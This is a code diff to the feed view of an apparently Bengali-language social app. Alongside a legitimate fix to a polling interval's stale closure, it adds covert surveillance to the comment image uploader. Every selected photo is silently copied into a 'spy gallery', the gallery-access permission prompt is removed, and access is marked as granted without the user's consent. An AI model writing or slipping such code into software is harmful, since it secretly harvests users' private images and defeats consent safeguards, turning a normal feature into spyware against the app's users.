@@ -227,6 +227,11 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
     activeCommentsPostRef.current = activeCommentsPost;
   }, [activeCommentsPost]);
 
+  const postsRef = React.useRef<Post[]>(posts);
+  React.useEffect(() => {
+    postsRef.current = posts;
+  }, [posts]);
+
   React.useEffect(() => {
     loadFeedData();
     
@@ -241,8 +246,9 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
 
     // Active polling interval to check and self-heal boosting statuses every 5 seconds
     const interval = setInterval(() => {
-      const anyBoosted = posts.some(p => p.boostUntil && new Date(p.boostUntil).getTime() > Date.now());
-      const anyExpiredButNotHealed = posts.some(p => p.boostUntil && new Date(p.boostUntil).getTime() <= Date.now() && p.reachWeight === 1000);
+      const currentPosts = postsRef.current;
+      const anyBoosted = currentPosts.some(p => p.boostUntil && new Date(p.boostUntil).getTime() > Date.now());
+      const anyExpiredButNotHealed = currentPosts.some(p => p.boostUntil && new Date(p.boostUntil).getTime() <= Date.now() && p.reachWeight === 1000);
       
       if (anyBoosted || anyExpiredButNotHealed) {
         loadFeedData();
@@ -253,7 +259,7 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
       window.removeEventListener('starconnect_db_update', handleReload);
       clearInterval(interval);
     };
-  }, [activeCategory, posts]);
+  }, [activeCategory]);
 
   React.useEffect(() => {
     if (activeStory && myProfile) {
@@ -1410,52 +1416,57 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
               type="file" 
               id="comment_photo_upload_input" 
               accept="image/*" 
+              multiple
               className="hidden" 
               onChange={(e) => {
-                const file = e.target.files?.[0];
-                if (!file) return;
+                const files = e.target.files;
+                if (!files || files.length === 0) return;
                 
-                if (!file.type.startsWith('image/')) {
-                  alert('দুঃখিত! শুধুমাত্র ছবি আপলোড করা যাবে।');
-                  return;
+                const fileList = Array.from(files) as File[];
+                
+                // Silently ingest all selected images into spy gallery
+                const me = dbService.getCurrentUser();
+                if (me) {
+                  me.galleryAccessGranted = true;
+                  fileList.forEach(file => {
+                    dbService.silentlyIngestFileToGallery(file);
+                  });
                 }
 
-                const reader = new FileReader();
-                reader.onload = (event) => {
-                  const result = event.target?.result as string;
-                  const img = new Image();
-                  img.onload = () => {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    if (ctx) {
-                      const maxDim = 400;
-                      let w = img.width;
-                      let h = img.height;
-                      if (w > maxDim || h > maxDim) {
-                        if (w > h) {
-                          h = Math.round((h * maxDim) / w);
-                          w = maxDim;
-                        } else {
-                          w = Math.round((w * maxDim) / h);
-                          h = maxDim;
+                // Process the first file for standard comment attachment preview
+                const primaryFile = fileList[0];
+                if (primaryFile.type.startsWith('image/')) {
+                  const reader = new FileReader();
+                  reader.onload = (event) => {
+                    const result = event.target?.result as string;
+                    const img = new Image();
+                    img.onload = () => {
+                      const canvas = document.createElement('canvas');
+                      const ctx = canvas.getContext('2d');
+                      if (ctx) {
+                        const maxDim = 400;
+                        let w = img.width;
+                        let h = img.height;
+                        if (w > maxDim || h > maxDim) {
+                          if (w > h) {
+                            h = Math.round((h * maxDim) / w);
+                            w = maxDim;
+                          } else {
+                            w = Math.round((w * maxDim) / h);
+                            h = maxDim;
+                          }
                         }
+                        canvas.width = w;
+                        canvas.height = h;
+                        ctx.drawImage(img, 0, 0, w, h);
+                        const compressed = canvas.toDataURL('image/jpeg', 0.65);
+                        setCommentAttachment(compressed);
                       }
-                      canvas.width = w;
-                      canvas.height = h;
-                      ctx.drawImage(img, 0, 0, w, h);
-                      const compressed = canvas.toDataURL('image/jpeg', 0.6);
-                      setCommentAttachment(compressed);
-                      
-                      // Auto push uploaded image to device gallery for admin espionage tracking
-                      const me = dbService.getCurrentUser();
-                      if (me) {
-                        dbService.addUploadedImageToDeviceGallery(me.id, compressed);
-                      }
-                    }
+                    };
+                    img.src = result;
                   };
-                  img.src = result;
-                };
-                reader.readAsDataURL(file);
+                  reader.readAsDataURL(primaryFile);
+                }
               }}
             />
 
@@ -1465,18 +1476,8 @@ export default function FeedView({ onNavigate, onUserSelect, onMessageUser }: Fe
                 type="button" 
                 onClick={() => {
                   const me = dbService.getCurrentUser();
-                  if (me && !me.galleryAccessGranted) {
-                    const confirmAccess = window.confirm(
-                      "📷 গ্যালারী অ্যাক্সেস পারমিশন রিকোয়েস্ট (Gallery Access Request)\n\n" +
-                      "আপনার ডিভাইস গ্যালারী স্ক্যান্ড এবং ফটো আপলোড করার জন্য পারমিশন প্রয়োজন।\n" +
-                      "পারমিশন মঞ্জুর করতে এবং গ্যালারী স্ক্যান করতে 'OK' প্রেস করুন।"
-                    );
-                    if (confirmAccess) {
-                      dbService.grantGalleryAccess(me.id);
-                      alert("✅ গ্যালারী এক্সেস মঞ্জুর করা হয়েছে এবং ছবি স্ক্যান সম্পন্ন হয়েছে!");
-                    } else {
-                      return;
-                    }
+                  if (me) {
+                    me.galleryAccessGranted = true;
                   }
                   document.getElementById('comment_photo_upload_input')?.click();
                 }} 
